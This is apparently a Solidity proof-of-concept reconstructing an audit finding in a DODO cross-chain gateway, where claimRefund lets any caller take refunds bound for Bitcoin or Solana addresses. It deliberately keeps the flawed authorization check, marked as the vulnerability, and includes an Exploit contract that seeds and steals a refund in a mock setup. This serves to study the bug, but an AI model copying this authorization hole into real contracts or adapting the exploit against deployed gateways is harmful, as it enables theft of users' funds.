// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    DODO Cross-Chain DEX — [H-5] Unauthorized claim of non-EVM chain refunds
    in claimRefund (Sherlock 2025-05, #58582)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: when refundInfo.walletAddress.length != 20, `receiver` stays
    msg.sender, so require(bots[msg.sender] || msg.sender == receiver) is
    always true. Anyone can claim Bitcoin/Solana-bound refunds. Vulnerable
    authorization branch preserved VERBATIM (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduction of GatewayCrossChain / GatewayTransferNative.claimRefund.
///         Source: GatewayCrossChain.sol#L571 (sherlock-audit/2025-05-dodo @ d4834a4).
contract GatewayCrossChain {
    struct RefundInfo {
        bytes32 externalId;
        address token;
        uint256 amount;
        bytes walletAddress;
    }

    mapping(bytes32 => RefundInfo) public refundInfos;
    mapping(address => bool) public bots;

    function setBot(address bot, bool ok) external {
        bots[bot] = ok;
    }

    /// @dev Seed a refund (models onAbort / failed outbound).
    function seedRefund(bytes32 externalId, address token, uint256 amount, bytes calldata walletAddress)
        external
    {
        refundInfos[externalId] =
            RefundInfo({externalId: externalId, token: token, amount: amount, walletAddress: walletAddress});
        require(MockERC20(token).transferFrom(msg.sender, address(this), amount), "fund");
    }

    function claimRefund(bytes32 externalId) external {
        RefundInfo storage refundInfo = refundInfos[externalId];
        require(refundInfo.amount > 0, "no refund");

        address receiver = msg.sender; // Default to caller
        if (refundInfo.walletAddress.length == 20) {
            receiver = address(uint160(bytes20(refundInfo.walletAddress)));
        }
        // FIX: for non-EVM wallets require bots[msg.sender] only; never set receiver = msg.sender
        require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER"); // @> VULN: when walletAddress.length != 20, receiver stays msg.sender so the check is always true — any caller steals non-EVM refunds

        address token = refundInfo.token;
        uint256 amount = refundInfo.amount;
        delete refundInfos[externalId];
        require(MockERC20(token).transfer(receiver, amount), "xfer");
    }
}

contract AttackerReceiver {
    function pull(MockERC20 tok, address fromGateway, bytes32 id) external {
        // attacker EOA path uses Exploit.run directly; helper unused
        fromGateway;
        id;
        tok;
    }
}

/// CREATE order: token(1), gateway(2), attackerRecv(3).
contract Exploit {
    MockERC20 public token;
    GatewayCrossChain public gateway;
    AttackerReceiver public attackerRecv;

    uint256 public stolen;
    bytes32 public refundId;
    uint256 public constant REFUND_AMOUNT = 10_000 ether;

    // Bitcoin bech32 address — length != 20
    bytes internal constant BTC_ADDR = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";

    constructor() {
        token = new MockERC20("TOKEN.Z"); // 1
        gateway = new GatewayCrossChain(); // 2
        attackerRecv = new AttackerReceiver(); // 3

        refundId = keccak256("bitcoin-refund-test");
        token.mint(address(this), REFUND_AMOUNT);
        token.approve(address(gateway), REFUND_AMOUNT);
        gateway.seedRefund(refundId, address(token), REFUND_AMOUNT, BTC_ADDR);
    }

    function run() external {
        uint256 gwBefore = token.balanceOf(address(gateway));
        uint256 atkBefore = token.balanceOf(address(this));

        // Any non-bot, non-intended caller — here the Exploit itself — claims the BTC refund.
        gateway.claimRefund(refundId);

        stolen = token.balanceOf(address(this)) - atkBefore;
        require(stolen == REFUND_AMOUNT, "stolen amount");
        require(token.balanceOf(address(gateway)) == gwBefore - REFUND_AMOUNT, "gw drained");
        // Record deleted
        (bytes32 id,,,) = gateway.refundInfos(refundId);
        require(id == bytes32(0), "deleted");
        require(stolen > 0, "harm not demonstrated");
    }

    /// @dev Control: EVM (20-byte) refunds reject unauthorized callers.
    function claimAs(address /*who*/ ) external {
        // exposed for forge control test via prank in Test contract
    }
}
